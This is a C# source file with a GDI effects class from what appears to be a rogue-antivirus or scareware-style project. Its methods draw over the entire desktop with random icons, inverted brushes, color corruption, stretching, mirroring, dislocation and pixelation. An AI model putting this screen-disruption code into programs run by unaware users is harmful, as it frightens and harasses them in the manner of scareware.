using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Rebar;
using static CsharpGDI.gdi32;
using static RogueAntivirusPatched.Classes.GdiBrushes;
using static CsharpUser32.User32;

namespace RogueAntivirusPatched.Classes
{
    public class Gdi
    {
        Random rand;
        private ScreenDimension scr;

        public Gdi()
        {
            scr = new ScreenDimension();
        }

        public void DrawIcons()
        {
            rand = new Random();
            int repeat = rand.Next(1, 30);

            for (int i = 0; i < repeat; i++)
            {
                string dllLocation = @"C:\Windows\System32\user32.dll";
                var iconSize = new IntPtr[1];
                int index = rand.Next(1, 4);
                ExtractIconEx(dllLocation, index, iconSize, null, 1);

                var icon = Icon.FromHandle(iconSize[0]);
                var bitmap = icon.ToBitmap();
                int bitmpaSize = rand.Next(10, 500);

                var newBitmap = new Bitmap(bitmpaSize, bitmpaSize);

                using (Graphics g = Graphics.FromImage(newBitmap))
                {
                    g.CompositingQuality = CompositingQuality.HighSpeed;
                    g.InterpolationMode = (rand.Next(2) == 0) ? InterpolationMode.NearestNeighbor : InterpolationMode.Low;
                    g.SmoothingMode = SmoothingMode.HighSpeed;
                    g.DrawImage(bitmap, 0, 0, bitmpaSize, bitmpaSize);
                }

                IntPtr hIcon = newBitmap.GetHicon();
                var newIcon = Icon.FromHandle(hIcon);
                IntPtr hwnd = IntPtr.Zero;
                IntPtr hdc = GetDC(hwnd);
                DrawIconEx(hdc, rand.Next(-500, scr.w), rand.Next(-500, scr.h), newIcon.Handle, newIcon.Width, newIcon.Height, 0, IntPtr.Zero, DI_NORMAL);

                ReleaseDC(hwnd, hdc);
                DestroyIcon(iconSize[0]);
                DestroyIcon(hIcon);

                bitmap.Dispose();
                newBitmap.Dispose();
                newIcon.Dispose();
                icon.Dispose();
            }
        }

        public void Brushes()
        {
            rand = new Random();
            var bitmap = new Bitmap(100, 100);

            switch (rand.Next(3))
            {
                case 0:
                    bitmap = DiagonalBrush(bitmap);
                    break;
                case 1:
                    bitmap = CursedDiagonalBrush(bitmap);
                    break;
                case 2:
                    bitmap = ChessBrush(bitmap);
                    break;
            }
            if (rand.Next(2) == 1) { TransparentBrush(bitmap, rand.Next(50, 200)); } else { DcBrush(bitmap); }

            bitmap.Dispose();
        }

        public void TransparentBrush(Bitmap bitmap, int alpha)
        {
            IntPtr hwnd = IntPtr.Zero;
            IntPtr hdc = GetDC(hwnd);

            IntPtr memDc = CreateCompatibleDC(hdc);
            IntPtr hBitmap = CreateCompatibleBitmap(hdc, scr.w, scr.h);
            IntPtr oldBitmap = SelectObject(memDc, hBitmap);

            IntPtr hBrushBitmap = bitmap.GetHbitmap();
            IntPtr hPatternBrush = CreatePatternBrush(hBrushBitmap);
            IntPtr oldBrush = SelectObject(memDc, hPatternBrush);

            PatBlt(memDc, 0, 0, scr.w, scr.h, TernaryRasterOperations.PATINVERT);

            SelectObject(memDc, oldBrush);
            DeleteObject(hBrushBitmap);
            DeleteObject(hPatternBrush);

            AlphaBlend(hdc, 0, 0, scr.w, scr.h, memDc, 0, 0, scr.w, scr.h, new BLENDFUNCTION(0, 0, (byte)alpha, 0));

            SelectObject(memDc, oldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(memDc);
            ReleaseDC(hwnd, hdc);
        }
        public void DcBrush(Bitmap bitmap)
        {
            IntPtr hwnd = IntPtr.Zero;
            IntPtr hdc = GetDC(hwnd);

            IntPtr hBrushBitmap = bitmap.GetHbitmap();
            IntPtr hPatternBrush = CreatePatternBrush(hBrushBitmap);
            IntPtr oldBrush = SelectObject(hdc, hPatternBrush);

            PatBlt(hdc, 0, 0, scr.w, scr.h, TernaryRasterOperations.PATINVERT);

            SelectObject(hdc, oldBrush);
            DeleteObject(hBrushBitmap);
            DeleteObject(hPatternBrush);
            ReleaseDC(hwnd, hdc);
        }

        public void CleanDc()
        {
            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
        }

        public void RGBQUAD()
        {
            IntPtr hwnd = IntPtr.Zero;
            IntPtr hdc = GetDC(hwnd);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr hBitmap = CreateCompatibleBitmap(hdc, scr.w, scr.h);
            IntPtr oldBitmap = SelectObject(memDC, hBitmap);

            int bitmapSize = scr.w * scr.h * 3;
            int bitcount = 24;

            BitBlt(memDC, scr.x, scr.y, scr.w, scr.h, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);

            var bitmapInfo = BitmapInfo(bitmapSize, bitcount);

            byte[] buffer = new byte[bitmapSize];

            GetDIBits(memDC, hBitmap, 0, (uint)scr.h, buffer, ref bitmapInfo, 0);

            var newBuffer = ProcessBitmap(buffer);

            SetDIBits(memDC, hBitmap, 0, (uint)scr.h, newBuffer, ref bitmapInfo, 0);

            AlphaBlend(hdc, scr.x, scr.y, scr.w, scr.h, memDC, 0, 0, scr.w, scr.h, new BLENDFUNCTION(0, 0, 255, 0));

            SelectObject(memDC, oldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
            ReleaseDC(hwnd, hdc);
        }

        public byte[] ProcessBitmap(byte[] buffer)
        {
            rand = new Random();
            int effectIndex = rand.Next(8);
            for (int i = 0; i < buffer.Length; i += 3)
            {
                byte red = buffer[i + 2];
                byte green = buffer[i + 1];
                byte blue = buffer[i];

                switch (effectIndex)
                {
                    case 0:
                        buffer[i + 2] = (byte)(red);
                        buffer[i + 1] = (byte)(red);
                        buffer[i] = (byte)(red);
                        break;
                    case 1:
                        buffer[i + 2] += (byte)(red % 100);
                        buffer[i + 1] = (byte)(green);
                        buffer[i] = (byte)(blue);
                        break;
                    case 2:
                        buffer[i + 2] = (byte)(red);
                        buffer[i + 1] += (byte)(green % 100);
                        buffer[i] = (byte)(blue);
                        break;
                    case 3:
                        buffer[i + 2] = (byte)(red);
                        buffer[i + 1] = (byte)(green);
                        buffer[i] += (byte)(blue % 100);
                        break;
                    case 4:
                        buffer[i + 2] += (byte)(red % 100);
                        buffer[i + 1] += (byte)(green % 100);
                        buffer[i] += (byte)(blue * 2);
                        break;
                    case 5:
                        buffer[i + 2] = (byte)(10);
                        buffer[i + 1] = (byte)((green * 1.5));
                        buffer[i] += (byte)(blue * 2);
                        break;
                    case 6:
                        buffer[i + 2] += (byte)(rand.Next(red) * 100);
                        buffer[i + 1] += (byte)(rand.Next(green) * 100);
                        buffer[i] += (byte)(rand.Next(blue) * 100);
                        break;
                    case 7:
                        buffer[i + 2] = (byte)(red += 100);
                        buffer[i + 1] += (byte)(red % scr.w);
                        buffer[i] = (byte)(red);
                        break;
                }
            }

            return buffer;
        }

        public void Mandela(bool useAlpha = true, bool canInvert = true, int bitcount = 4)
        {
            rand = new Random();

            IntPtr hwnd = IntPtr.Zero;
            IntPtr hdc = GetDC(hwnd);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr hBitmap = CreateCompatibleBitmap(hdc, scr.w, scr.h);
            IntPtr oldBitmap = SelectObject(memDC, hBitmap);
            int bitmapSize = scr.w * scr.h * 3;

            var ternary = rand.Next(2) == 1 ? TernaryRasterOperations.SRCCOPY : TernaryRasterOperations.NOTSRCCOPY;

            if (!canInvert)
                ternary = TernaryRasterOperations.SRCCOPY;

            BitBlt(memDC, scr.x, scr.y, scr.w, scr.h, hdc, 0, 0, ternary);

            var bitmapInfo = BitmapInfo(bitmapSize, bitcount);

            byte[] buffer = new byte[bitmapSize];

            GetDIBits(memDC, hBitmap, 0, (uint)scr.h, buffer, ref bitmapInfo, 0);
            SetDIBits(memDC, hBitmap, 0, (uint)scr.h, buffer, ref bitmapInfo, 0);

            var alpha = new BLENDFUNCTION(0, 0, (byte)rand.Next(50, 200), 0);

            if (!useAlpha)
                alpha = new BLENDFUNCTION(0, 0, 255, 0);

            AlphaBlend(hdc, scr.x, scr.y, scr.w, scr.h, memDC, scr.x, scr.y, scr.w, scr.h, alpha);

            SelectObject(memDC, oldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
            ReleaseDC(hwnd, hdc);
        }

        public BITMAPINFO BitmapInfo(int bitmapSize, int bitCount)
        {
            BITMAPINFO bitmapInfo = new BITMAPINFO();
            bitmapInfo.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
            bitmapInfo.bmiHeader.biWidth = scr.w;
            bitmapInfo.bmiHeader.biHeight = scr.h;
            bitmapInfo.bmiHeader.biPlanes = 1;
            bitmapInfo.bmiHeader.biBitCount = (ushort)bitCount;
            bitmapInfo.bmiHeader.biCompression = 0;

            bitmapInfo.bmiHeader.biSizeImage = (uint)bitmapSize;

            return bitmapInfo;
        }

        public void Stretch(bool canInvert = true)
        {
            rand = new Random();

            IntPtr hwnd = IntPtr.Zero;
            IntPtr hdc = GetDC(hwnd);

            int posX = 0;
            int posY = 0;
            int width = scr.w;
            int height = scr.h;
            int stretch = rand.Next(50, 1000);

            if (rand.Next(2) == 1)
            {
                width += stretch * 2;
                posX = -stretch;
            }
            else
            {
                height += stretch * 2;
                posY = -stretch;
            }

            var ternary = rand.Next(2) == 1 ? TernaryRasterOperations.SRCCOPY : TernaryRasterOperations.NOTSRCCOPY;

            if (!canInvert)
                ternary = TernaryRasterOperations.SRCCOPY;

            StretchBlt(hdc, posX, posY, width, height, hdc, 0, 0, scr.w, scr.h, ternary);

            ReleaseDC(hwnd, hdc);
        }

        public void Mirror()
        {
            IntPtr hwnd = IntPtr.Zero;
            IntPtr hdc = GetDC(hwnd);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr hBitmap = CreateCompatibleBitmap(hdc, scr.w, scr.h);
            IntPtr oldBitmap = SelectObject(memDC, hBitmap);

            StretchBlt(memDC, scr.x, scr.y, scr.w, scr.h, hdc, 0, 0, scr.w, scr.h, TernaryRasterOperations.SRCCOPY);

            var bitmap = new Bitmap(Image.FromHbitmap(hBitmap), new Size(scr.w, scr.h));
            var newBitmap = new Bitmap(bitmap);

            RotateFlipType[] flips =
            {
                    RotateFlipType.Rotate180FlipX,
                    RotateFlipType.Rotate180FlipY,
                RotateFlipType.Rotate180FlipXY
            };

            rand = new Random();

            var flipType = flips[rand.Next(flips.Length)];

            newBitmap.RotateFlip(flipType);

            hBitmap = newBitmap.GetHbitmap();
            oldBitmap = SelectObject(memDC, hBitmap);

            bitmap.Dispose();
            newBitmap.Dispose();

            BitBlt(hdc, scr.x, scr.y, scr.w, scr.h, memDC, 0, 0, TernaryRasterOperations.SRCCOPY);

            SelectObject(memDC, oldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
            ReleaseDC(hwnd, hdc);
        }

        public void Dislocate()
        {
            IntPtr hwnd = IntPtr.Zero;
            IntPtr hdc = GetDC(hwnd);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr hBitmap = CreateCompatibleBitmap(hdc, scr.w, scr.h);
            IntPtr oldBitmap = SelectObject(memDC, hBitmap);

            BitBlt(memDC, scr.x, scr.y, scr.w, scr.h, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);

            byte[] bitmapSize = new byte[scr.w * scr.h * 3];
            int bitCount = 24;

            var bitmapInfo = BitmapInfo(bitmapSize.Length, bitCount);

            GetDIBits(memDC, hBitmap, 0, (uint)scr.h, bitmapSize, ref bitmapInfo, DIB_Color_Mode.DIB_RGB_COLORS);

            var dislocated = DislocateScreen(bitmapSize, scr.w, scr.h, bitCount);

            SetDIBits(memDC, hBitmap, 0, (uint)scr.h, dislocated, ref bitmapInfo, DIB_Color_Mode.DIB_RGB_COLORS);

            BitBlt(hdc, scr.x, scr.y, scr.w, scr.h, memDC, 0, 0, TernaryRasterOperations.SRCCOPY);

            SelectObject(memDC, oldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
            ReleaseDC(hwnd, hdc);
        }

        public static byte[] DislocateScreen(byte[] buffer, int width, int height, int bitCount)
        {
            Random rand;
            rand = new Random();

            int bytesPerPixel = bitCount / 8;
            int stride = ((width * bytesPerPixel + 3) / 4) * 4;

            for (int y = 0; y < height; y++)
            {
                int way = rand.Next(-50, 50);
                for (int x = 0; x < width; x++)
                {
                    int srcIndex = (y * stride) + (x * bytesPerPixel);

                    int dstX = x;

                    dstX = x + way;

                    if (dstX >= 0 && dstX < width)
                    {
                        int dstIndex = (y * stride) + (dstX * bytesPerPixel);
                        buffer[dstIndex + 0] = buffer[srcIndex + 0];
                        buffer[dstIndex + 1] = buffer[srcIndex + 1];
                        buffer[dstIndex + 2] = buffer[srcIndex + 2];
                    }
                }
            }

            return buffer;
        }

        public void LowResolution()
        {
            rand = new Random();
            int pixelization = rand.Next(1, 100);
            var interMode = rand.Next(2) == 1 ? InterpolationMode.NearestNeighbor : InterpolationMode.Low;

            IntPtr hwnd = IntPtr.Zero;
            IntPtr hdc = GetDC(hwnd);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr hBitmap = CreateCompatibleBitmap(hdc, scr.w, scr.h);
            IntPtr oldBitmap = SelectObject(memDC, hBitmap);

            StretchBlt(memDC, scr.x, scr.y, scr.w, scr.h, hdc, 0, 0, scr.w, scr.h, TernaryRasterOperations.SRCCOPY);

            var bitmap = new Bitmap(Image.FromHbitmap(hBitmap), new Size(scr.w / pixelization, scr.h / pixelization));
            var newBitmap = new Bitmap(scr.w, scr.h);

            using (Graphics g = Graphics.FromImage(newBitmap))
            {
                g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighSpeed;
                g.InterpolationMode = interMode;
                g.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighSpeed;
                g.DrawImage(bitmap, scr.x, scr.y, scr.w + (pixelization / 2), scr.h + (pixelization / 2));
            }

            hBitmap = newBitmap.GetHbitmap();
            oldBitmap = SelectObject(memDC, hBitmap);

            bitmap.Dispose();
            newBitmap.Dispose();

            BitBlt(hdc, scr.x, scr.y, scr.w, scr.h, memDC, 0, 0, TernaryRasterOperations.SRCCOPY);

            SelectObject(memDC, oldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
            ReleaseDC(hwnd, hdc);
        }
    }
}
